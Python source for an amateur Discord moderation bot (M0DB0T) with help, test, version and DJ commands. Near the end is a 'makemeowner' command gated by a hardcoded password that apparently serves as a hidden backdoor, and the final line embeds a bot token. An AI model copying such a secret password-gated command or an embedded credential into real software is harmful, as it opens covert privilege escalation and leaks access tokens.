#M0DB0T by AnimeDevotee#3847
#Credits to St3vi3 Richi3#5015
import discord
...
authusrs = "AnimeDevotee#38472"
Testers = "AnimeDevotee#3847"
devs = "AnimeDevotee#3847"
Owner = "AnimeDevotee#3847"
@bot.event
async def on_ready():
	print("Loading...")
	print("Done!")
	await bot.change_presence(game=discord.Game(name="!help"), status=discord.Status("online"), afk=False)
	print("M0DB0T by AnimeDevotee#3847")
...
async def help(ctx):
	...
	embed=discord.Embed(title="Help", description="This is a list of commands for Anime-ModBot, all commands are used with the prefix '!', this list only applies to the server you sent the help command in and the roles you have in said server.", color=0x8080ff)
...
async def test(ctx):
	...
	if str(author)==Testers:
		...
		await bot.say("bot running version DEV-0.1.14")
...
async def ver(ctx):
	...
	embed.add_field(name="Bot version", value="DEV-0.1.14", inline=False)
	embed.add_field(name="Changes", value="Updated !help so it displays commands that you can use, Updated !ver", inline=False)
	await bot.say(embed=embed)
...
@bot.command(pass_context=True)
async def makemeowner(ctx, message):
	if (message == "IamCoolkidAnimeDevoteenowGetonMylevel!"):
		msg = await bot.get_message(ctx.message.channel, ctx.message.id)
		await bot.delete_message(msg)
		member = ctx.message.author
		...
		await bot.say(":warning:WARNING:warning: Incorrect password.")

@bot.command(pass_context=True)
async def DJ(ctx, member: discord.Member, message):
    if ctx.message.author.server_permissions.administrator:
...
bot.run("NDkxNjc5NjQwMjg1MzQ3ODQ1.DoLevQ.J8tOe3Y5YFByj16tXzug3Mcjik4")
